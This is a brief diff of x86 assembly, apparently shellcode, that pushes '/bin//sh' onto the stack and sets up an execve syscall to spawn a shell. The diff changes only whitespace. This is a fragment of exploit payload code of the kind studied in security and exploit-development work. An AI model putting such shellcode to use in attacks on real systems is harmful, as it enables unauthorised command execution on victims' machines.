@@ -37,8 +37,8 @@
     pop     eax         ; eax = sys_execve
     cdq                 ; edx = 0
     push    edx         ; '\0'
-    push    '//sh'    	; 
-    push    '/bin'    	; 
+    push    '//sh'      ; 
+    push    '/bin'      ; 
     mov     ebx, esp    ; ebx = "/bin//sh", 0
     push    edx         ; NULL
     push    ebx         ; "/bin//sh", 0
